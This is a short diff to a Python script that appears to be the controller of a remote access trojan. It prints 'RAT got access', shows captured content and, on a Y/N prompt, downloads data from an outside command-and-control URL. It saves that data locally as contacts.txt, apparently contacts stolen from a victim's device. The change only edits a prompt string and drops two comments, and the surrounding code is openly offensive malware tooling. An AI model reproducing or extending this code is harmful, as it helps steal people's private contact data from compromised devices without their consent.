@@ -21,16 +21,14 @@ while True:
                 os.system('clear')
                 print(f"{GREEN}RAT got access. Proceeding...{RESET}")
                 print(f"{GREEN}Content:\n {content} {RESET}")
-                user_input = input("Download content? Y/N: ")
+                user_input = input("Download data? Y/N: ")
                 if user_input.strip().lower() == 'y':
                     try:
                         download_url = "http://bluntcord.medianewsonline.com/aroid_to/download.php"
                         download_response = requests.get(download_url)
                         if download_response.status_code == 200:
-                            # Save directly to your Downloads folder
                             save_path = os.path.expanduser('~/Downloads/contacts.txt')
                             save_dir = os.path.dirname(save_path)
-                            # Create the directory if it doesn't exist
                             if not os.path.exists(save_dir):
                                 os.makedirs(save_dir)
                             with open(save_path, 'wb') as file:
